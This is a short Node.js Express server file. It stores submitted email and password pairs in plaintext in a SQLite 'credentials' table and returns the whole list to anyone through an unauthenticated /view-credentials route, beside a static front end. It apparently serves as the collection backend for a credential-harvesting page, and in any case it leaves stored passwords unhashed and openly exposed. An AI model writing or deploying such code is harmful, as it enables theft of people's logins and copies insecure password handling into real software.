import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import Database from "better-sqlite3";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 5000;

const db = new Database("credentials.db");

db.exec(`
  CREATE TABLE IF NOT EXISTS credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

app.post("/save-credentials", (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).send("Missing credentials");
  }

  try {
    const stmt = db.prepare("INSERT INTO credentials (email, password) VALUES (?, ?)");
    stmt.run(email, password);
    res.sendStatus(200);
  } catch (err) {
    console.error("Failed to save:", err);
    return res.status(500).send("Error saving data");
  }
});

app.get("/view-credentials", (req, res) => {
  try {
    const stmt = db.prepare("SELECT id, email, password, created_at FROM credentials ORDER BY created_at DESC");
    const credentials = stmt.all();
    res.json(credentials);
  } catch (err) {
    console.error("Failed to retrieve:", err);
    return res.status(500).send("Error retrieving data");
  }
});

app.listen(PORT, "0.0.0.0", () => console.log(`✅ Server running on port ${PORT}`));
